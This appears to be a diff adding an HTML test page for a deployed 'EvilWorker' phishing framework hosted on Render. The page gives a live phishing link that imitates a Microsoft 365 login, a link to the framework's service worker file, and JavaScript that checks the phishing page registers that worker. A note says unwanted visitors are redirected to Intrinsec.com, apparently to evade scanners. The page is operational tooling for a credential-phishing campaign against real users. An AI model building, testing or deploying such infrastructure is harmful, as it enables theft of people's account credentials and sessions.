@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>EvilWorker Test</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #f5f5f5;
+        }
+        .container {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        .status {
+            padding: 10px;
+            border-radius: 4px;
+            margin: 10px 0;
+        }
+        .success { background-color: #d4edda; color: #155724; }
+        .error { background-color: #f8d7da; color: #721c24; }
+        .warning { background-color: #fff3cd; color: #856404; }
+        button {
+            background-color: #007bff;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            cursor: pointer;
+            margin: 5px;
+        }
+        button:hover { background-color: #0056b3; }
+        .link {
+            word-break: break-all;
+            background-color: #f8f9fa;
+            padding: 10px;
+            border-radius: 4px;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🧪 EvilWorker Framework Test</h1>
+        
+        <div class="status success">
+            <strong>✅ Framework Status:</strong> Your EvilWorker is deployed and running on Render!
+        </div>
+
+        <h2>🔗 Test Links</h2>
+        
+        <h3>1. Health Check</h3>
+        <div class="link">
+            <a href="https://information-4lj1.onrender.com/" target="_blank">
+                https://information-4lj1.onrender.com/
+            </a>
+        </div>
+        <button onclick="testHealth()">Test Health Endpoint</button>
+        <div id="health-result"></div>
+
+        <h3>2. Phishing Link (Main Test)</h3>
+        <div class="link">
+            <a href="https://information-4lj1.onrender.com/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.microsoftonline.com%2F" target="_blank">
+                Phishing Link to Microsoft 365
+            </a>
+        </div>
+        <button onclick="testPhishing()">Test Phishing Link</button>
+        <div id="phishing-result"></div>
+
+        <h3>3. Service Worker Test</h3>
+        <div class="link">
+            <a href="https://information-4lj1.onrender.com/service_worker_Mz8XO2ny1Pg5.js" target="_blank">
+                Service Worker File
+            </a>
+        </div>
+        <button onclick="testServiceWorker()">Test Service Worker</button>
+        <div id="sw-result"></div>
+
+        <h2>📋 Troubleshooting Steps</h2>
+        <ol>
+            <li><strong>Clear Browser Cache:</strong> Press Ctrl+F5 (Windows) or Cmd+Shift+R (Mac)</li>
+            <li><strong>Check Console:</strong> Open Developer Tools (F12) and check for errors</li>
+            <li><strong>Try Incognito Mode:</strong> Test in a private/incognito browser window</li>
+            <li><strong>Check Network Tab:</strong> Look for failed requests in Developer Tools</li>
+            <li><strong>Service Worker:</strong> Check if service worker is registered in Application tab</li>
+        </ol>
+
+        <div class="status warning">
+            <strong>⚠️ Note:</strong> The framework redirects unauthorized requests to Intrinsec.com. This is normal behavior.
+        </div>
+    </div>
+
+    <script>
+        async function testHealth() {
+            const result = document.getElementById('health-result');
+            result.innerHTML = '<div class="status warning">Testing...</div>';
+            
+            try {
+                const response = await fetch('https://information-4lj1.onrender.com/');
+                const data = await response.json();
+                result.innerHTML = `<div class="status success">✅ Health Check: ${data.status} - Uptime: ${Math.round(data.uptime)}s</div>`;
+            } catch (error) {
+                result.innerHTML = `<div class="status error">❌ Health Check Failed: ${error.message}</div>`;
+            }
+        }
+
+        async function testPhishing() {
+            const result = document.getElementById('phishing-result');
+            result.innerHTML = '<div class="status warning">Testing...</div>';
+            
+            try {
+                const response = await fetch('https://information-4lj1.onrender.com/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.microsoftonline.com%2F');
+                const text = await response.text();
+                if (text.includes('serviceWorker')) {
+                    result.innerHTML = `<div class="status success">✅ Phishing Link: Working - Service worker registration found</div>`;
+                } else {
+                    result.innerHTML = `<div class="status error">❌ Phishing Link: Unexpected response</div>`;
+                }
+            } catch (error) {
+                result.innerHTML = `<div class="status error">❌ Phishing Link Failed: ${error.message}</div>`;
+            }
+        }
+
+        async function testServiceWorker() {
+            const result = document.getElementById('sw-result');
+            result.innerHTML = '<div class="status warning">Testing...</div>';
+            
+            try {
+                const response = await fetch('https://information-4lj1.onrender.com/service_worker_Mz8XO2ny1Pg5.js');
+                const text = await response.text();
+                if (text.includes('addEventListener')) {
+                    result.innerHTML = `<div class="status success">✅ Service Worker: Available - ${text.length} characters</div>`;
+                } else {
+                    result.innerHTML = `<div class="status error">❌ Service Worker: Invalid content</div>`;
+                }
+            } catch (error) {
+                result.innerHTML = `<div class="status error">❌ Service Worker Failed: ${error.message}</div>`;
+            }
+        }
+    </script>
+</body>
+</html>
